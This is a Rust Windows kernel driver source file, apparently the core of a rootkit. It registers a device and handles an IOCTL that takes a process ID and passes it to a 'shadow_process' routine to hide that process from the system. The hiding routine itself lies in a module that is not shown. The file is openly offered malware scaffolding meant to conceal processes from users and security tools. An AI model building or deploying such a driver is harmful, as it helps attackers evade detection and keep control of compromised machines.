#![no_std]
extern crate alloc;

#[cfg(not(test))]
extern crate wdk_panic;

mod utils;
use utils::ToUnicodeString;

mod process;
use process::shadow_process;



mod constants;
use constants::IOCTL_PROCESS_HIDE_REQUEST;


#[cfg(not(test))]
use wdk_alloc::WdkAllocator;

use wdk::{nt_success, println};
use wdk_sys::ntddk::{IoCreateDevice, IoDeleteDevice, IoCreateSymbolicLink, IoDeleteSymbolicLink, IofCompleteRequest};
use wdk_sys::{
    DRIVER_OBJECT, IRP_MJ_CREATE,IRP_MJ_DEVICE_CONTROL, NTSTATUS, PCUNICODE_STRING, PDEVICE_OBJECT,
    PIRP, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION, STATUS_UNSUCCESSFUL, IO_NO_INCREMENT
};





#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

#[export_name = "DriverEntry"] // WDF expects a symbol with the name DriverEntry
pub unsafe extern "system" fn driver_entry(
    driver: &mut DRIVER_OBJECT,
    _registry_path: PCUNICODE_STRING,
) -> NTSTATUS {
    println!("Hello world!");

    let mut device_name: UNICODE_STRING = "\\Device\\MyDevice\0".to_unicode();

    let mut dos_name: UNICODE_STRING = "\\??\\MyDevice\0".to_unicode();

    let mut device: PDEVICE_OBJECT = core::ptr::null_mut();

    let status = IoCreateDevice(driver, 0, &mut device_name, 0, 0, 0, &mut device);

    if !nt_success(status) {
        return status;
    }

    let status = IoCreateSymbolicLink(&mut dos_name, &mut device_name);

    if !nt_success(status) {
        return status;
    }

    (*driver).MajorFunction[IRP_MJ_CREATE as usize] = Some(major_function_create);
    (*driver).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(major_function_device_control);

    (*driver).DriverUnload = Some(driver_exit);

    STATUS_SUCCESS
}

// Function called when the driver is unloaded (on exit)
extern "C" fn driver_exit(driver: *mut DRIVER_OBJECT) {
    println!("Exiting driver!");
    unsafe {
        IoDeleteDevice((*driver).DeviceObject);
    };
    println!("Deleted device!");
    let mut dos_name: UNICODE_STRING = "\\DosDevices\\MyDevice".to_unicode();
    unsafe {
        let _ = IoDeleteSymbolicLink(&mut dos_name);
    };
}

unsafe extern "C" fn major_function_create(_device: PDEVICE_OBJECT, _pirp: PIRP) -> NTSTATUS {
    println!("Major function create called!");
    STATUS_SUCCESS
}

unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp: PIRP) -> NTSTATUS {
    let stack = io_get_current_irp_stack_location(pirp);
    let ioctl = (*stack).Parameters.DeviceIoControl.IoControlCode;
    let mut status = STATUS_UNSUCCESSFUL;

    match ioctl {
        IOCTL_PROCESS_HIDE_REQUEST => {
            let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
            println!("Hiding process PID: {}", target_pid);
            
            let output_buffer = (*pirp).UserBuffer as *mut u32;
            let mut informations = 0;

            status = match shadow_process(target_pid) {
                Ok(true) => {
                    println!("Process {:?} successfully shadowed", target_pid);
                    
                    if !output_buffer.is_null() {
                        *output_buffer = 0x1;
                        informations = 4;
                    }
                    
                    STATUS_SUCCESS
                },

                Ok(false) => {
                    println!("Unknown error calling shadow_process");

                    if !output_buffer.is_null() {
                        *output_buffer = 0x0;
                        informations = 4;
                    }

                    STATUS_UNSUCCESSFUL
                }
                
                Err(e) => {
                    println!("Error calling shadow_process: {:?}", e);
                    
                    if !output_buffer.is_null() {
                        *output_buffer = 0x0;
                        informations = 4;
                    }
                    
                    STATUS_UNSUCCESSFUL
                },
            };

            complete_request(pirp, status, informations);
        },
        _ => {
            println!("Unknown IOCTL code: 0x{:X}", ioctl);
        }
    }

    println!("Major function device control called!");
    status
}



pub unsafe fn io_get_current_irp_stack_location(irp: PIRP) -> PIO_STACK_LOCATION {
    assert!((*irp).CurrentLocation <= (*irp).StackCount + 1); // todo maybe do error handling instead of an assert?
    (*irp)
        .Tail
        .Overlay
        .__bindgen_anon_2
        .__bindgen_anon_1
        .CurrentStackLocation
}


pub unsafe  fn complete_request(irp: PIRP, status: NTSTATUS, information: usize) {
    (*irp).IoStatus.__bindgen_anon_1.Status = status;
    (*irp).IoStatus.Information = information as u64;
    IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
}


